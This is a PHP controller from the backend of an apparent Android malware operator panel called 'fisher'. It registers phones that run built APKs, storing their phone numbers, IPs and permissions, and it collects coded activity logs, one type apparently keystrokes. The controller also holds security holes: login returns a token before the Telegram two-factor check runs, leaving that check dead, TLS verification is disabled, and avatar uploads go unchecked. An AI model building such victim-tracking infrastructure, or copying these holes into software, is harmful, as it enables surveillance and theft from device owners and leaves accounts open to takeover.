<?php
namespace app\controller;

use app\BaseController;
use think\facade\Cache;
use think\facade\Db;
use think\facade\Request;
use think\Response;

class AuthController extends BaseController
{
    private function isBlockedDeviceId(string $deviceId): bool
    {
        $deviceId = trim($deviceId);
        $blockedIds = ['a8abb0d9f7f0cf72'];
        $configuredIds = array_filter(array_map(
            'trim',
            explode(',', (string)env('BLOCKED_DEVICE_IDS', ''))
        ), 'strlen');

        return $deviceId !== '' && in_array(
            $deviceId,
            array_unique(array_merge($blockedIds, $configuredIds)),
            true
        );
    }

    private function getSystemResourceInfo(): array
    {
        $cacheKey = 'system_resource_info_v1';
        try {
            $cached = Cache::get($cacheKey);
            if (is_array($cached)) {
                return $cached;
            }
        } catch (\Throwable $e) {
            // Resource collection still works if the file cache is unavailable.
        }

        $metrics = [
            'cpuUsage' => 0,
            'cpuCores' => (int)($_SERVER['NUMBER_OF_PROCESSORS'] ?? 1),
            'cpuModel' => 'Intel/AMD',
            'memUsage' => 0,
            'memTotal' => 0,
            'memUsed' => 0,
            'diskUsage' => 0,
            'diskTotal' => 0,
            'diskUsed' => 0,
        ];

        try {
            $diskPath = PHP_OS_FAMILY === 'Windows' ? 'C:\\' : '/';
            $metrics['diskTotal'] = @disk_total_space($diskPath) ?: 0;
            $diskFree = @disk_free_space($diskPath) ?: 0;
            $metrics['diskUsed'] = $metrics['diskTotal'] - $diskFree;
            $metrics['diskUsage'] = $metrics['diskTotal'] > 0
                ? (int)(($metrics['diskUsed'] / $metrics['diskTotal']) * 100)
                : 0;

            if (PHP_OS_FAMILY === 'Windows') {
                $memInfo = @shell_exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /value 2>nul');
                if ($memInfo && preg_match('/TotalVisibleMemorySize=(\d+)/', $memInfo, $match)) {
                    $metrics['memTotal'] = (int)$match[1] * 1024;
                }
                if ($memInfo && preg_match('/FreePhysicalMemory=(\d+)/', $memInfo, $match)) {
                    $metrics['memUsed'] = $metrics['memTotal'] - ((int)$match[1] * 1024);
                }
                $metrics['memUsage'] = $metrics['memTotal'] > 0
                    ? (int)(($metrics['memUsed'] / $metrics['memTotal']) * 100)
                    : 0;

                $cpuLine = @shell_exec('wmic cpu get loadpercentage /value 2>nul');
                if ($cpuLine && preg_match('/LoadPercentage=(\d+)/', $cpuLine, $match)) {
                    $metrics['cpuUsage'] = (int)$match[1];
                }
            }
        } catch (\Throwable $e) {
            // Partial metrics are preferable to failing the system-info API.
        }

        try {
            Cache::set($cacheKey, $metrics, 15);
        } catch (\Throwable $e) {
            // Do not fail the API because a cache directory is unavailable.
        }
        return $metrics;
    }

    /**
     * POST /api/auth/check-initialization
     * 检查是否有管理员账号
     */
    public function checkInitialization()
    {
        $count = Db::table('fisher_users')->count();
        return json([
            'success' => true,
            'data' => [
                'initialized' => $count > 0,
                'version' => '1.0.0',
            ],
            'message' => 'success',
        ]);
    }

    /**
     * POST /api/auth/login
     * 用户登录
     */
    public function login()
    {
        $data = Request::post();
        $username = $data['username'] ?? '';
        $password = $data['password'] ?? '';

        if (!$username || !$password) {
            return json(['success' => false, 'message' => '用户名和密码不能为空'], 400);
        }

        $user = Db::table('fisher_users')->where('username', $username)->find();
        if (!$user) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '用户名或密码错误'], 401);
        }

        if (!password_verify($password, $user['password_hash'])) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '用户名或密码错误'], 401);
        }

        // 检查账号是否被禁用
        if (isset($user['enabled']) && ($user['enabled'] === 0 || $user['enabled'] === '0' || $user['enabled'] === false)) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '该账号已被禁用，请联系管理员'], 403);
        }

        // 检查账号是否已过期
        if (!empty($user['expire_at']) && (int)$user['expire_at'] > 0 && (int)$user['expire_at'] < time()) {
            $this->logLogin($username, 0);
            return json(['success' => false, 'message' => '该账号已过期，请联系管理员续期'], 403);
        }

        // 本地开发启动：直接签发 JWT，避免本地环境依赖 Telegram 二次验证。
        $this->logLogin($username, 1);
        $token = $this->generateToken($user);
        return json([
            'success' => true,
            'data' => [
                'token' => $token,
                'user' => [
                    'id' => $user['id'],
                    'username' => $user['username'],
                    'role' => $user['role'],
                    'permissions' => $this->permissionsForRole($user['permissions'] ?? null, $user['role'] ?? 'user'),
                    'avatar' => $user['avatar'] ?? '/hdkj.png',
                    'maxDevices' => $user['max_devices'] ?? 100,
                    'max_sub_users' => $user['max_sub_users'] ?? null,
                ],
            ],
            'message' => 'success',
        ]);

        $telegram = $this->getTelegramLoginConfig($user);
        if (empty($telegram['chat_id'])) {
            return json(['success' => false, 'message' => '该账号未绑定 Telegram Chat ID，请联系管理员'], 403);
        }
        if (empty($telegram['bot_token'])) {
            return json(['success' => false, 'message' => '系统尚未配置 Telegram Bot Token'], 503);
        }

        $this->cleanupExpiredLoginChallenges();
        $challengeId = bin2hex(random_bytes(16));
        $code = (string)random_int(100000, 999999);
        $secret = (string)env('JWT.JWT_SECRET', '');
        if (strlen($secret) < 32 || in_array($secret, ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'], true)) {
            return json(['success' => false, 'message' => 'JWT_SECRET 未配置或不安全'], 500);
        }
        $challenge = [
            'user_id' => (int)$user['id'],
            'username' => $user['username'],
            'code_hash' => hash_hmac('sha256', $challengeId . ':' . $code, $secret),
            'expires_at' => time() + 300,
            'attempts' => 0,
        ];
        $challengeKey = 'tg_login_challenge_' . $challengeId;
        $challengeValue = json_encode($challenge, JSON_UNESCAPED_UNICODE);
        $existingChallenge = Db::table('fisher_settings')->where('key', $challengeKey)->find();
        if ($existingChallenge) {
            Db::table('fisher_settings')->where('key', $challengeKey)->update(['value' => $challengeValue]);
        } else {
            Db::table('fisher_settings')->insert(['key' => $challengeKey, 'value' => $challengeValue]);
        }

        [$sent, $sendError] = $this->sendTelegramLoginCode($telegram, $user, $code);
        if (!$sent) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => 'Telegram 验证码发送失败: ' . $sendError], 502);
        }

        return json([
            'success' => true,
            'data' => [
                'requiresTelegram2FA' => true,
                'challengeId' => $challengeId,
                'expiresIn' => 300,
            ],
            'message' => '验证码已发送到 Telegram',
        ]);
    }

    /**
     * POST /api/auth/login-telegram-verify
     * 校验 Telegram 登录验证码并签发 JWT
     */
    public function verifyTelegramLogin()
    {
        $data = Request::post();
        $challengeId = trim((string)($data['challengeId'] ?? $data['challenge_id'] ?? ''));
        $code = trim((string)($data['code'] ?? ''));

        if (!preg_match('/^[a-f0-9]{32}$/', $challengeId) || !preg_match('/^\d{6}$/', $code)) {
            return json(['success' => false, 'message' => '验证码格式错误'], 400);
        }

        $challengeKey = 'tg_login_challenge_' . $challengeId;
        $row = Db::table('fisher_settings')->where('key', $challengeKey)->find();
        if (!$row) {
            return json(['success' => false, 'message' => '验证码已失效，请重新登录'], 400);
        }

        $challenge = json_decode($row['value'] ?? '', true);
        if (!$challenge || empty($challenge['user_id']) || (int)($challenge['expires_at'] ?? 0) < time()) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '验证码已过期，请重新登录'], 400);
        }

        $attempts = (int)($challenge['attempts'] ?? 0);
        if ($attempts >= 5) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '验证码错误次数过多，请重新登录'], 429);
        }

        $secret = (string)env('JWT.JWT_SECRET', '');
        if (strlen($secret) < 32 || in_array($secret, ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'], true)) {
            return json(['success' => false, 'message' => 'JWT_SECRET 未配置或不安全'], 500);
        }
        $expected = hash_hmac('sha256', $challengeId . ':' . $code, $secret);
        if (!hash_equals((string)$challenge['code_hash'], $expected)) {
            $challenge['attempts'] = $attempts + 1;
            if ($challenge['attempts'] >= 5) {
                Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            } else {
                Db::table('fisher_settings')->where('key', $challengeKey)->update([
                    'value' => json_encode($challenge, JSON_UNESCAPED_UNICODE),
                ]);
            }
            return json(['success' => false, 'message' => 'Telegram 验证码错误'], 401);
        }

        $user = Db::table('fisher_users')->where('id', (int)$challenge['user_id'])->find();
        if (!$user) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '用户不存在'], 401);
        }
        if (isset($user['enabled']) && ($user['enabled'] === 0 || $user['enabled'] === '0' || $user['enabled'] === false)) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '该账号已被禁用'], 403);
        }
        if (!empty($user['expire_at']) && (int)$user['expire_at'] > 0 && (int)$user['expire_at'] < time()) {
            Db::table('fisher_settings')->where('key', $challengeKey)->delete();
            return json(['success' => false, 'message' => '该账号已过期'], 403);
        }

        Db::table('fisher_settings')->where('key', $challengeKey)->delete();
        $this->logLogin($user['username'], 1);
        $token = $this->generateToken($user);

        return json([
            'success' => true,
            'data' => [
                'token' => $token,
                'user' => [
                    'id' => $user['id'],
                    'username' => $user['username'],
                    'role' => $user['role'],
                    'permissions' => $this->permissionsForRole($user['permissions'] ?? null, $user['role'] ?? 'user'),
                    'avatar' => $user['avatar'] ?? '/assets/img/mx_logo.png',
                    'maxDevices' => $user['max_devices'] ?? 100,
                    'max_sub_users' => $user['max_sub_users'] ?? null,
                ],
            ],
            'message' => 'success',
        ]);
    }

    /**
     * POST/GET /api/auth/verify
     * 验证 token
     */
    public function verify()
    {
        $user = $this->request->user ?? null;
        if (!$user) {
            return json(['success' => false, 'message' => 'Token验证失败'], 401);
        }

        $dbUser = Db::table('fisher_users')->where('id', $user['user_id'])->find();
        if (!$dbUser) {
            return json(['success' => false, 'message' => '用户不存在'], 401);
        }

        // 检查账号是否被禁用
        if (isset($dbUser['enabled']) && ($dbUser['enabled'] === 0 || $dbUser['enabled'] === '0' || $dbUser['enabled'] === false)) {
            return json(['success' => false, 'message' => '该账号已被禁用'], 403);
        }

        return json([
            'success' => true,
            'data' => [
                'valid' => true,
                'user' => [
                    'id' => $dbUser['id'],
                    'username' => $dbUser['username'],
                    'role' => $dbUser['role'],
                    'permissions' => $this->permissionsForRole($dbUser['permissions'] ?? null, $dbUser['role'] ?? 'user'),
                    'avatar' => $dbUser['avatar'] ?? '/assets/img/mx_logo.png',
                    'maxDevices' => $dbUser['max_devices'] ?? 100,
                    'max_sub_users' => $dbUser['max_sub_users'] ?? null,
                ],
            ],
            'role' => $dbUser['role'],
            'message' => 'success',
        ]);
    }

    /**
     * POST /api/auth/register
     * 注册
     */
    public function register()
    {
        // Public registration is only used for the first system account.
        if (Db::table('fisher_users')->count() > 0) {
            return json(['success' => false, 'message' => '系统已完成初始化，请在账号管理中创建用户'], 403);
        }

        $data = Request::post();
        $username = $data['username'] ?? '';
        $password = $data['password'] ?? '';

        if (!$username || !$password) {
            return json(['success' => false, 'message' => '用户名和密码不能为空'], 400);
        }

        $exists = Db::table('fisher_users')->where('username', $username)->find();
        if ($exists) {
            return json(['success' => false, 'message' => '用户名已存在'], 400);
        }

        Db::table('fisher_users')->insert([
            'username'    => $username,
            'password_hash' => password_hash($password, PASSWORD_BCRYPT),
            'role'        => 'user',
            'created_at'  => time(),
        ]);

        return json(['success' => true, 'data' => null, 'message' => '注册成功']);
    }

    /**
     * POST /api/auth/logout
     */
    public function logout()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/auth/change-password
     * 修改密码
     */
    public function changePassword()
    {
        $user = $this->request->user ?? $this->request->userPayload ?? null;
        if (!$user) {
            return json(['success' => false, 'message' => 'Unauthorized'], 401);
        }

        $data = Request::post();
        $oldPassword = $data['oldPassword'] ?? $data['currentPassword'] ?? '';
        $newPassword = $data['newPassword'] ?? $data['password'] ?? '';

        if (!$oldPassword || !$newPassword) {
            return json(['success' => false, 'message' => '原密码和新密码不能为空'], 400);
        }

        $dbUser = Db::table('fisher_users')->where('id', $user['user_id'])->find();
        if (!$dbUser) {
            return json(['success' => false, 'message' => '用户不存在'], 404);
        }

        if (!password_verify($oldPassword, $dbUser['password_hash'])) {
            return json(['success' => false, 'message' => '原密码错误'], 400);
        }

        Db::table('fisher_users')->where('id', $user['user_id'])->update([
            'password_hash' => password_hash($newPassword, PASSWORD_BCRYPT),
        ]);

        return json(['success' => true, 'data' => null, 'message' => '密码修改成功']);
    }

    /**
     * POST /api/auth/upload-avatar
     * 上传头像
     */
    public function uploadAvatar()
    {
        $file = Request::file('avatar') ?: Request::file('file');
        if (!$file) {
            return json(['success' => false, 'message' => 'No file'], 400);
        }

        $saveName = \think\facade\Filesystem::disk('public')->putFile('avatars', $file);
        $url = '/storage/' . $saveName;

        $user = $this->request->user ?? $this->request->userPayload ?? null;
        if ($user) {
            Db::table('fisher_users')->where('id', $user['user_id'])->update(['avatar' => $url]);
        }

        return json(['success' => true, 'data' => ['avatar' => $url], 'message' => 'success']);
    }

    /**
     * POST /api/client/register
     * APK 客户端设备注册
     */
    public function clientRegister()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? $data['sessionId'] ?? '';

        if ($this->isBlockedDeviceId((string)$deviceId)) {
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        if (!$deviceId) {
            return json(['success' => false, 'message' => '缺少 deviceId'], 400);
        }

        $now = time();
        $ip = Request::ip();
        $permissions = isset($data['permissions']) ? json_encode($data['permissions'], JSON_UNESCAPED_UNICODE) : '{}';
        $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();

        // app_name: 旧 Python 后端取 appName || deviceName
        $appName = $data['appName'] ?? $data['deviceName'] ?? '';
        // 设备注册接口对 APK 开放，不能信任客户端自行提交的 ownerUsername。
        // 归属只允许来自服务器在构建时保存的“应用名 -> 用户”映射。
        $ownerUsername = '';
        if ($appName !== '') {
            $mappedOwner = Db::table('fisher_app_owner_map')
                ->where('app_name', $appName)
                ->value('owner_username');
            if ($mappedOwner) {
                $owner = Db::table('fisher_users')->where('username', $mappedOwner)->find();
                if ($owner) {
                    $notExpired = empty($owner['expire_at']) || (int)$owner['expire_at'] >= $now;
                    if ((bool)($owner['enabled'] ?? false) && $notExpired) {
                        $ownerUsername = (string)$mappedOwner;
                    }
                }
            }
        }

        if ($existing) {
            $updates = [
                'brand'        => $data['brand'] ?? $existing['brand'],
                'model'        => $data['model'] ?? $existing['model'],
                'os_version'   => $data['osVersion'] ?? $existing['os_version'],
                'app_version'  => $data['appVersion'] ?? $existing['app_version'],
                'app_name'     => $appName ?: ($existing['app_name'] ?? ''),
                'phone_number' => $data['phoneNumber'] ?? $existing['phone_number'],
                'public_ip'    => $ip,
                'screen_width' => $data['screenWidth'] ?? $existing['screen_width'],
                'screen_height'=> $data['screenHeight'] ?? $existing['screen_height'],
                'is_connected' => 1,
                'connected_at' => $now,
                'last_seen'    => $now,
                'permissions'  => $permissions,
            ];
            if ($ownerUsername && empty($existing['owner_username'])) {
                $updates['owner_username'] = $ownerUsername;
            }
            Db::table('fisher_devices')->where('device_id', $deviceId)->update($updates);
        } else {
            Db::table('fisher_devices')->insert([
                'device_id'      => $deviceId,
                'brand'          => $data['brand'] ?? '',
                'model'          => $data['model'] ?? '',
                'os_version'     => $data['osVersion'] ?? '',
                'app_version'    => $data['appVersion'] ?? '',
                'app_name'       => $appName,
                'phone_number'   => $data['phoneNumber'] ?? '',
                'public_ip'      => $ip,
                'screen_width'   => $data['screenWidth'] ?? 0,
                'screen_height'  => $data['screenHeight'] ?? 0,
                'is_connected'   => 1,
                'connected_at'   => $now,
                'last_seen'      => $now,
                'first_seen'     => $now,
                'created_at'     => $now,
                'permissions'    => $permissions,
                'owner_username' => $ownerUsername,
            ]);
        }

        // 广播设备上线通知
        static::broadcastToAdmins([
            'type'      => 'device_online',
            'deviceId'  => $deviceId,
            'sessionId' => $deviceId,
            'data'      => $data,
        ]);

        return json(['success' => true, 'data' => ['deviceId' => $deviceId], 'message' => 'success']);
    }

    /**
     * POST /api/client/logs
     * APK 客户端日志上报
     */
    public function clientLogs()
    {
        $ALLOWED_LOG_TYPES = ['KSTR', 'NTFS', 'VAPS', 'BLNK', 'ACTZ', 'ARTS'];

        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $logs = $data['logs'] ?? [];

        if ($this->isBlockedDeviceId((string)$deviceId)) {
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        if ($deviceId) {
            // 自动注册设备
            $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
            if (!$existing) {
                $now = time();
                Db::table('fisher_devices')->insert([
                    'device_id'    => $deviceId,
                    'public_ip'    => Request::ip(),
                    'is_connected' => 1,
                    'connected_at' => $now,
                    'last_seen'    => $now,
                    'first_seen'   => $now,
                    'created_at'   => $now,
                ]);
            }

            // 保存操作日志（根据 log_type 白名单分流到不同表）
            if (is_array($logs)) {
                $operationBatch = [];
                $bridgeBatch = [];
                $batchSize = 200;
                $now = time();
                foreach ($logs as $entry) {
                    if (is_array($entry)) {
                        $logType = strtoupper((string)($entry['logType'] ?? 'info'));
                        $row = [
                            'device_id'  => $deviceId,
                            'log_type'   => $logType,
                            'content'    => $entry['content'] ?? '',
                            'timestamp'  => intval($entry['timestamp'] ?? 0),
                            'created_at' => $now,
                        ];
                        // 6 种业务类型 → operation 表，其他 → bridge 表
                        if (in_array($logType, $ALLOWED_LOG_TYPES, true)) {
                            $operationBatch[] = $row;
                            if (count($operationBatch) >= $batchSize) {
                                Db::table('fisher_operation_logs')->insertAll($operationBatch);
                                $operationBatch = [];
                            }
                        } else {
                            $bridgeBatch[] = $row;
                            if (count($bridgeBatch) >= $batchSize) {
                                Db::table('fisher_bridge_logs')->insertAll($bridgeBatch);
                                $bridgeBatch = [];
                            }
                        }
                    }
                }
                if ($operationBatch) {
                    Db::table('fisher_operation_logs')->insertAll($operationBatch);
                }
                if ($bridgeBatch) {
                    Db::table('fisher_bridge_logs')->insertAll($bridgeBatch);
                }
            }
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/users/login-logs
     * 登录日志
     */
    public function loginLogs()
    {
        if (Request::isDelete()) {
            Db::table('fisher_login_logs')->delete(true);
            return json(['success' => true, 'data' => null, 'message' => 'Login logs cleared']);
        }

        $rows = Db::table('fisher_login_logs')->order('created_at', 'desc')->limit(100)->select()->toArray();
        return json(['success' => true, 'data' => $rows, 'message' => 'success']);
    }

    // ========== 辅助方法 ==========

    private function permissionsForRole($permissions, string $role): ?array
    {
        $decoded = null;
        if (is_array($permissions)) {
            $decoded = $permissions;
        } elseif (is_string($permissions) && trim($permissions) !== '') {
            $value = json_decode($permissions, true);
            if (is_array($value)) $decoded = $value;
        }

        if ($role !== 'user') {
            return $decoded;
        }

        // 普通账号即使存在历史脏数据，也不向前端授予账号管理入口。
        $decoded = $decoded ?: [];
        return array_values(array_diff(array_filter($decoded, 'is_string'), ['accounts']));
    }

    /**
     * 生成 JWT token
     */
    private function generateToken(array $user): string
    {
        $secret = (string)env('JWT.JWT_SECRET', '');
        $weakSecrets = ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'];
        if (strlen($secret) < 32 || in_array($secret, $weakSecrets, true)) {
            throw new \RuntimeException('JWT_SECRET 未配置或不安全');
        }
        $header = $this->base64url(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
        $payload = $this->base64url(json_encode([
            'user_id'   => $user['id'],
            'username'  => $user['username'],
            'role'      => $user['role'],
            'exp'       => time() + 86400 * 30, // 30 天
        ]));
        $signature = $this->base64url(hash_hmac('sha256', "$header.$payload", $secret, true));
        return "$header.$payload.$signature";
    }

    /**
     * Base64 URL 编码
     */
    private function base64url(string $data): string
    {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    /**
     * 记录登录日志
     */
    private function logLogin(string $username, int $success): void
    {
        Db::table('fisher_login_logs')->insert([
            'username'   => $username,
            'ip'         => Request::ip(),
            'user_agent' => Request::header('User-Agent', ''),
            'success'    => $success,
            'created_at' => time(),
        ]);
    }

    /**
     * Resolve the recipient binding and the inherited bot configuration.
     * A managed account owns only its Chat ID; token and proxy come from the
     * closest account in its parent chain that configured the Telegram bot.
     */
    private function getTelegramLoginConfig(array $user): array
    {
        $userId = (int)($user['id'] ?? 0);
        $username = trim((string)($user['username'] ?? ''));
        // Read current and historical binding keys. Older deployments saved
        // the value through the global settings form or before user IDs were
        // available, so those keys are retained as a migration fallback.
        $chatId = '';
        $chatKeys = ['tg_' . $userId . '_chat_id'];
        if ($username !== '') $chatKeys[] = 'tg_user_' . $username . '_chat_id';
        if (in_array(($user['role'] ?? ''), ['admin', 'superadmin', 'super-admin'], true)) {
            $chatKeys[] = 'chat_id';
            $chatKeys[] = 'tg_0_chat_id';
        }
        foreach (array_unique($chatKeys) as $chatKey) {
            $value = Db::table('fisher_settings')->where('key', $chatKey)->value('value');
            if (trim((string)$value) !== '') { $chatId = trim((string)$value); break; }
        }
        // Keep compatibility with user records imported from earlier builds,
        // which stored the binding under the username key or directly on user.
        if ($chatId === '' && !empty($user['telegram_chat_id'])) {
            $chatId = (string)$user['telegram_chat_id'];
        }

        $botToken = '';
        $apiProxy = '';
        $current = $user;
        $visited = [];
        while (!empty($current['id']) && !isset($visited[$current['id']])) {
            $visited[$current['id']] = true;
            $prefix = 'tg_' . (int)$current['id'] . '_';
            $rows = Db::table('fisher_settings')
                ->whereIn('key', [$prefix . 'bot_token', $prefix . 'api_proxy'])
                ->select()->toArray();
            foreach ($rows as $row) {
                if ($row['key'] === $prefix . 'bot_token' && !$botToken) $botToken = trim((string)$row['value']);
                if ($row['key'] === $prefix . 'api_proxy' && !$apiProxy) $apiProxy = trim((string)$row['value']);
            }
            if ($botToken) break;

            $parent = trim((string)($current['parent_username'] ?? ''));
            $current = $parent ? (Db::table('fisher_users')->where('username', $parent)->find() ?: []) : [];
        }

        // Compatibility with the original global Telegram settings page for
        // administrator accounts. Per-user/parent settings always win.
        if ($botToken === '' && in_array(($user['role'] ?? ''), ['admin', 'superadmin', 'super-admin'], true)) {
            $botToken = trim((string)Db::table('fisher_settings')->where('key', 'bot_token')->value('value'));
            $apiProxy = $apiProxy ?: trim((string)Db::table('fisher_settings')->where('key', 'api_proxy')->value('value'));
        }

        return ['chat_id' => trim((string)$chatId), 'bot_token' => $botToken, 'api_proxy' => $apiProxy];
    }

    /** Delete expired one-time login challenges from the settings store. */
    private function cleanupExpiredLoginChallenges(): void
    {
        $rows = Db::table('fisher_settings')->where('key', 'like', 'tg_login_challenge_%')->select()->toArray();
        foreach ($rows as $row) {
            $challenge = json_decode($row['value'] ?? '', true);
            if (!$challenge || (int)($challenge['expires_at'] ?? 0) < time()) {
                Db::table('fisher_settings')->where('key', $row['key'])->delete();
            }
        }
    }

    /** Send the one-time login code using the same IPv4/proxy path as Telegram settings. */
    private function sendTelegramLoginCode(array $telegram, array $user, string $code): array
    {
        $url = 'https://api.telegram.org/bot' . $telegram['bot_token'] . '/sendMessage';
        $message = "<b>登录验证</b>\n\n账号：<code>" . htmlspecialchars((string)$user['username'], ENT_QUOTES, 'UTF-8') . "</code>\n验证码：<code>{$code}</code>\n有效期：5 分钟\n\n请勿将验证码告知他人。";
        $payload = json_encode(['chat_id' => $telegram['chat_id'], 'text' => $message, 'parse_mode' => 'HTML']);
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_NOSIGNAL => true,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        if (!empty($telegram['api_proxy'])) {
            curl_setopt($ch, CURLOPT_PROXY, trim($telegram['api_proxy']));
        }
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($error) return [false, $error];
        $result = json_decode((string)$response, true);
        if ($status !== 200 || empty($result['ok'])) return [false, (string)($result['description'] ?? 'Telegram API 请求失败')];
        return [true, ''];
    }

    /**
     * GET /api/system/info
     * 系统信息
     */
    public function systemInfo()
    {
        $totalDevices = Db::table('fisher_devices')->count();

        // 从 Node.js 获取真实在线设备数和 uptime
        $onlineDevices = 0;
        $uptime = 0;
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $health = @file_get_contents(self::wsBaseUrl() . '/health', false, $ctx);
            if ($health) {
                $hData = json_decode($health, true);
                $onlineDevices = $hData['onlineDevices'] ?? 0;
                $uptime = $hData['uptime'] ?? 0;
            }
        } catch (\Throwable $e) {}
        if ($onlineDevices === 0) {
            $onlineDevices = Db::table('fisher_devices')->where('is_connected', 1)->count();
        }

        $resourceInfo = $this->getSystemResourceInfo();

        // APK 数量
        $totalApks = Db::table('fisher_apk_builds')->count();

        return json([
            'success' => true,
            'data' => [
                'version'       => '1.0.0',
                'uptime'        => $uptime,
                'totalDevices'  => $totalDevices,
                'onlineDevices' => $onlineDevices,
                'totalApks'     => $totalApks,
                'totalAbPacks'  => 0,
                'cpuUsage'      => $resourceInfo['cpuUsage'],
                'cpuCores'      => $resourceInfo['cpuCores'],
                'cpuModel'      => $resourceInfo['cpuModel'],
                'memUsage'      => $resourceInfo['memUsage'],
                'memTotal'      => $resourceInfo['memTotal'],
                'memUsed'       => $resourceInfo['memUsed'],
                'diskUsage'     => $resourceInfo['diskUsage'],
                'diskTotal'     => $resourceInfo['diskTotal'],
                'diskUsed'      => $resourceInfo['diskUsed'],
            ],
            'message' => 'success',
        ]);
    }
}
